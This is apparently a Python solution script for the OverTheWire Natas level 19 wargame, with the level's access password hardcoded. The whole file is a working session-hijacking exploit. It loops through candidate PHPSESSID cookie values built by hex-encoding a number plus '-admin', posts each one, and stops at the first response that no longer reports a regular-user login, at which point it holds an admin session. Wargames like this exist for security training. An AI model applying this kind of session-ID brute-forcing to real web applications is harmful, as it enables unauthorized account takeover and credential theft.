import requests
from bs4 import BeautifulSoup
natas19_username = 'natas19'
natas19_password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'

admin_username = 'admin'
admin_password = 'admin'

url = 'http://natas19.natas.labs.overthewire.org/'

session_id_range = range(1, 1001)  # adjust this range as needed
session = requests.Session()
session.auth = (natas19_username, natas19_password)
suffix = '-admin'

output_file = open('output.txt', 'w')

for session_id in session_id_range:
    encoded_session_id = str(str(session_id) + suffix)
    encoded_session_id = encoded_session_id.encode('utf-8').hex()
    print(encoded_session_id)
    cookie = {'PHPSESSID': encoded_session_id}
    response = session.post(url, cookies=cookie, data={'username': admin_username, 'password': admin_password})

    soup = BeautifulSoup(response.text, 'html.parser')
    content_div = soup.find('div', id='content')

    output_file.write("--------------------------------------------------\n")
    output_file.write(f"Session ID: {session_id}\n")
    output_file.write(content_div.text.strip() + "\n")
    output_file.write("--------------------------------------------------\n")
    if 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.' not in content_div.text.strip():
        break
output_file.close()